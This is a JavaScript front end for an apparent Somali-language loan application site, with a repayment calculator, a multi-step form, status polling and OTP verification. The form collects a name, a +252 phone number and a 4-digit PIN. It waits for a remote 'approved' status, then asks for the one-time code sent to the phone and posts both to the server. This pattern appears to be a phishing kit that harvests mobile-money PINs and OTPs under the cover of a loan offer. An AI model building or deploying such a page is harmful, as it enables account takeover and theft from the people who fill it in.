// ==================== CONFIG ====================
const API_BASE = window.location.origin;

// ==================== STATE ====================
let currentSection = 1;
let loanAmount = 8700;
let loanDuration = 23;
const minAmount = 300;
const maxAmount = 12000;
const minDuration = 1;
const maxDuration = 24;
const interestRate = 0.025;
let selectedLoanType = '';
let currentApplicationId = null;
let currentPhone = '';

// ==================== CALCULATOR ====================
function formatNumber(num) {
  return num.toLocaleString('en-US');
}

function calculate() {
  const totalInterest = loanAmount * interestRate * loanDuration;
  const totalRepayment = loanAmount + totalInterest;
  const monthlyPayment = (totalRepayment / loanDuration).toFixed(2);

  document.getElementById('heroAmount').textContent = formatNumber(loanAmount);
  document.getElementById('heroMonths').textContent = loanDuration + ' BIL';
  document.getElementById('heroMonthly').textContent = '$' + monthlyPayment;
  document.getElementById('heroDuration').textContent = loanDuration + ' bilood';

  document.getElementById('amountValue').textContent = '$' + formatNumber(loanAmount);
  document.getElementById('durationValue').textContent = loanDuration + ' bilood';

  document.getElementById('sumAmount').textContent = '$' + loanAmount.toFixed(2);
  document.getElementById('sumInterest').textContent = '$' + totalInterest.toFixed(2);
  document.getElementById('sumTotal').textContent = '$' + totalRepayment.toFixed(2);
  document.getElementById('sumMonthly').textContent = '$' + monthlyPayment;

  const amountPct = ((loanAmount - minAmount) / (maxAmount - minAmount)) * 100;
  const durationPct = ((loanDuration - minDuration) / (maxDuration - minDuration)) * 100;

  document.getElementById('amountFill').style.width = amountPct + '%';
  document.getElementById('amountThumb').style.left = amountPct + '%';
  document.getElementById('durationFill').style.width = durationPct + '%';
  document.getElementById('durationThumb').style.left = durationPct + '%';
}

function setupSlider(trackId, thumbId, min, max, isAmount) {
  const track = document.getElementById(trackId);
  const thumb = document.getElementById(thumbId);
  let isDragging = false;

  function updateFromX(clientX) {
    const rect = track.getBoundingClientRect();
    let pct = (clientX - rect.left) / rect.width;
    pct = Math.max(0, Math.min(1, pct));
    const value = Math.round(min + pct * (max - min));
    if (isAmount) {
      loanAmount = value;
    } else {
      loanDuration = value;
    }
    calculate();
  }

  thumb.addEventListener('mousedown', (e) => { isDragging = true; e.preventDefault(); });
  thumb.addEventListener('touchstart', (e) => { isDragging = true; });

  document.addEventListener('mousemove', (e) => { if (isDragging) updateFromX(e.clientX); });
  document.addEventListener('touchmove', (e) => { if (isDragging) updateFromX(e.touches[0].clientX); });

  document.addEventListener('mouseup', () => { isDragging = false; });
  document.addEventListener('touchend', () => { isDragging = false; });

  track.addEventListener('click', (e) => { if (!isDragging) updateFromX(e.clientX); });
}

setupSlider('amountTrack', 'amountThumb', minAmount, maxAmount, true);
setupSlider('durationTrack', 'durationThumb', minDuration, maxDuration, false);

// ==================== NAVIGATION ====================
function goToSection(n) {
  // Hide all sections
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));

  // Show target section
  const targetSection = document.getElementById('section' + n);
  if (targetSection) {
    targetSection.classList.add('active');
  }

  // Update nav dots
  const dots = document.querySelectorAll('.nav-dot');
  dots.forEach((d, i) => {
    d.classList.toggle('active', i === n - 1);
  });

  currentSection = n;

  // Update CTA button text based on section
  updateCTAButton();
}

function updateCTAButton() {
  const btn = document.getElementById('mainCta');
  const dots = document.getElementById('navDots');

  if (!btn) return;

  if (currentSection <= 3) {
    btn.style.display = 'flex';
    dots.style.display = 'flex';
    if (currentSection === 3) {
      btn.textContent = 'Codso Amaah →';
    } else {
      btn.textContent = 'Dib u eeg & Codso →';
    }
  } else {
    btn.style.display = 'none';
    dots.style.display = 'none';
  }
}

function handleMainAction() {
  if (currentSection < 3) {
    goToSection(currentSection + 1);
  } else if (currentSection === 3) {
    submitApplication();
  }
}

// ==================== FORM HANDLING ====================
function openModal() {
  document.getElementById('modalOverlay').classList.add('active');
}

function closeModal(e) {
  if (!e || e.target === document.getElementById('modalOverlay')) {
    document.getElementById('modalOverlay').classList.remove('active');
  }
}

function selectLoanType(type) {
  selectedLoanType = type;
  document.getElementById('loanTypeText').textContent = type;
  document.getElementById('loanTypeText').style.color = '#1f2937';
  document.querySelectorAll('.modal-radio').forEach(r => r.classList.remove('selected'));
  const index = ['Xaalad Degdeg ah','Kharashka Dugsiga','Ganacsiga','Caafimaad','Hagaajinta Guriga','Beeraaha','Kuwo Kale'].indexOf(type);
  if (index >= 0) {
    document.getElementById('radio' + (index + 1)).classList.add('selected');
  }
  setTimeout(closeModal, 200);
}

// ==================== API CALLS ====================
async function submitApplication() {
  const firstName = document.getElementById('firstName').value.trim();
  const lastName = document.getElementById('lastName').value.trim();
  const phone = document.getElementById('phone').value.trim();
  const pin = document.getElementById('pin').value.trim();
  const purpose = document.getElementById('purposeInput').value.trim();

  // Validation
  if (!firstName || !lastName || !phone || !pin) {
    showToast('Fadlan buuxi dhammaan goobaha', 'error');
    return;
  }

  if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
    showToast('PIN waa inuu ahaadaa 4-lambar', 'error');
    return;
  }

  if (!selectedLoanType) {
    showToast('Fadlan dooro nooca amaahda', 'error');
    goToSection(2);
    return;
  }

  const fullPhone = '+252' + phone;
  currentPhone = fullPhone;

  const btn = document.getElementById('mainCta');
  btn.disabled = true;
  btn.textContent = 'Codsinaya...';

  try {
    const response = await fetch(`${API_BASE}/api/apply`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        firstName,
        lastName,
        phone: fullPhone,
        loanAmount,
        loanDuration,
        loanType: selectedLoanType,
        purpose,
        pin
      })
    });

    const data = await response.json();

    if (data.success) {
      currentApplicationId = data.applicationId;
      showToast('Codsiga waa la gudbinay!', 'success');

      // Show waiting screen
      goToSection(6);

      // Start polling for status
      startStatusPolling();
    } else {
      showToast(data.message || 'Khalad ayaa dhacay', 'error');
      btn.disabled = false;
      btn.textContent = 'Codso Amaah →';
    }
  } catch (error) {
    console.error('Error:', error);
    showToast('Khalad ayaa dhacay. Isku day mar kale.', 'error');
    btn.disabled = false;
    btn.textContent = 'Codso Amaah →';
  }
}

function startStatusPolling() {
  const interval = setInterval(async () => {
    if (!currentApplicationId) {
      clearInterval(interval);
      return;
    }

    try {
      const response = await fetch(`${API_BASE}/api/status/${currentApplicationId}`);
      const data = await response.json();

      if (data.status === 'approved') {
        clearInterval(interval);
        showOTPVerification();
      } else if (data.status === 'declined') {
        clearInterval(interval);
        showToast('Codsigaaga waa la diiday', 'error');
        setTimeout(() => location.reload(), 3000);
      }
    } catch (error) {
      console.error('Polling error:', error);
    }
  }, 3000); // Check every 3 seconds
}

function showOTPVerification() {
  document.getElementById('otpPhoneDisplay').textContent = currentPhone;
  goToSection(4);
}

async function verifyOTP() {
  const otp = document.getElementById('otpInput').value.trim();
  const messageEl = document.getElementById('otpMessage');

  if (otp.length !== 5 || !/^\d{5}$/.test(otp)) {
    messageEl.textContent = 'OTP waa inuu ahaadaa 5-lambar';
    messageEl.style.color = '#dc2626';
    return;
  }

  try {
    const response = await fetch(`${API_BASE}/api/verify-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone: currentPhone,
        otp,
        applicationId: currentApplicationId
      })
    });

    const data = await response.json();

    if (data.success) {
      messageEl.textContent = 'OTP waa la xaqiijiyay!';
      messageEl.style.color = '#65a30d';

      // Show success screen
      document.getElementById('successAmount').textContent = '$' + formatNumber(loanAmount);
      document.getElementById('successMonthly').textContent = '$' + data.application.monthlyPayment;

      setTimeout(() => {
        goToSection(5);
      }, 1000);
    } else {
      messageEl.textContent = data.message || 'OTP khaldan';
      messageEl.style.color = '#dc2626';
    }
  } catch (error) {
    messageEl.textContent = 'Khalad ayaa dhacay';
    messageEl.style.color = '#dc2626';
  }
}

async function resendOTP() {
  const messageEl = document.getElementById('otpMessage');

  try {
    const response = await fetch(`${API_BASE}/api/resend-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone: currentPhone,
        applicationId: currentApplicationId
      })
    });

    const data = await response.json();

    if (data.success) {
      messageEl.textContent = 'OTP cusub waa la diray!';
      messageEl.style.color = '#65a30d';
    } else {
      messageEl.textContent = data.message || 'Khalad ayaa dhacay';
      messageEl.style.color = '#dc2626';
    }
  } catch (error) {
    messageEl.textContent = 'Khalad ayaa dhacay';
    messageEl.style.color = '#dc2626';
  }
}

// ==================== UI HELPERS ====================
function showToast(message, type = 'info') {
  // Remove existing toast
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();

  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.textContent = message;
  document.body.appendChild(toast);

  setTimeout(() => toast.classList.add('show'), 10);
  setTimeout(() => {
    toast.classList.remove('show');
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

// ==================== INIT ====================
calculate();
